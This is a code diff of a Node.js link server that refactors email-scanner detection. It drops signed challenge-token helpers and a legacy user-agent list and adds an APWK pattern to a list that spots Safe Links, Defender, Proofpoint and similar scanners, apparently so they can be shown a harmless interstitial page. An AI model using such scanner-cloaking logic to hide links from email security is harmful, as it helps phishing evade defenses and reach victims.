@@ -564,39 +564,6 @@ function hashFirstSeg(pathStr) {
   return crypto.createHash("sha256").update(first).digest("base64url").slice(0, 32);
 }
 
-// ================== CHALLENGE TOKEN FUNCTIONS (using ADMIN_TOKEN) ==================
-function createChallengeToken(nextEnc) {
-  const exp = Date.now() + (10 * 60 * 1000); // 10 min expiry
-  const payload = { next: nextEnc, exp, ts: Date.now() };
-  const token = Buffer.from(JSON.stringify(payload)).toString('base64url');
-  const sig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
-                   .update(token).digest('base64url');
-  return `${token}.${sig}`;
-}
-
-function verifyChallengeToken(challengeToken) {
-  if (!challengeToken || typeof challengeToken !== 'string') return null;
-  
-  const parts = challengeToken.split('.');
-  if (parts.length !== 2) return null;
-  
-  const [token, sig] = parts;
-  
-  // Verify signature using ADMIN_TOKEN
-  const expectedSig = crypto.createHmac('sha256', process.env.ADMIN_TOKEN)
-                          .update(token).digest('base64url');
-  if (sig !== expectedSig) return null;
-  
-  try {
-    const payload = JSON.parse(Buffer.from(token, 'base64url').toString());
-    // Check expiry
-    if (Date.now() > payload.exp) return null;
-    return payload;
-  } catch (e) {
-    return null;
-  }
-}
-
 // ================== ENHANCED CHALLENGE LIMITER ==================
 const limitChallengeView = makeIpLimiter({ 
   capacity: parseInt(process.env.CHALLENGE_VIEW_CAPACITY || "5", 10), 
@@ -619,8 +586,8 @@ function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
 </body>`);
 }
 
-// ================== ENHANCED SCANNER DETECTION ==================
-// Enhanced scanner detection with patterns and metadata
+// ================== ENHANCED SCANNER DETECTION - Enhanced scanner detection with patterns and metadata ==================
+
 const SCANNER_PATTERNS = [
   {
     pattern: /safelinks\.protection\.outlook\.com|microsoft.*safelinks/i,
@@ -660,6 +627,13 @@ const SCANNER_PATTERNS = [
   }
 ];
 
+SCANNER_PATTERNS.push({
+  pattern: /apwk/i,
+  name: "APWK Scanner",
+  confidence: 0.75,
+  type: "generic"
+});
+
 // External configuration support
 const EXTERNAL_SCANNER_CONFIG = process.env.SCANNER_CONFIG_URL || null;
 let dynamicScanners = [];
@@ -698,19 +672,12 @@ function detectScannerEnhanced(req) {
   return detected.sort((a, b) => b.confidence - a.confidence);
 }
 
-// Backward compatibility - keep the old array for reference
-const EMAIL_SCANNER_UAS = [
-  "safelinks", "microsoft office", "eop", "defender", "outlook",
-  "proofpoint", "mimecast", "barracuda", "url%20proxy", "apwk"
-].map(s => s.toLowerCase());
 /* ========================================================================== */
 
-/* ================== Scanner logging helper (inserted) ===================== */
-// ---- scanner logging helper (counts + rich log line) ----
+/* ================== Scanner logging helper (inserted) - scanner logging helper (counts + rich log line) ===================== */
 const SCANNER_STATS = { total: 0, byReason: Object.create(null), byUA: Object.create(null) };
 
-/* ======== Derived stats from LOGS (Option A) ========
-   Scans in-memory LOGS so stats reflect all recorded hits, not just counters. */
+/* ======== Derived stats from LOGS (Option A) - Scans in-memory LOGS so stats reflect all recorded hits, not just counters */
 function computeScannerStatsFromLogs() {
   const byReason = Object.create(null);
   const byUA = Object.create(null);
@@ -720,9 +687,7 @@ function computeScannerStatsFromLogs() {
   for (const line of lines) {
     if (!line || typeof line !== 'string') continue;
 
-    // We only count interstitial events that we explicitly log
-    // Example:
-    // [SCANNER] 200 interstitial ip=... ua="Microsoft Office ..." path="/..." accept="..." referer="" reason=Known scanner UA nextLen=124
+    /* We only count interstitial events that we explicitly log i.e [SCANNER] 200 interstitial ip=... ua="Microsoft Office ..." path="/..." accept="..." referer="" reason=Known scanner UA nextLen=124 */
     if (line.includes("[SCANNER] 200 interstitial")) {
       total += 1;
 
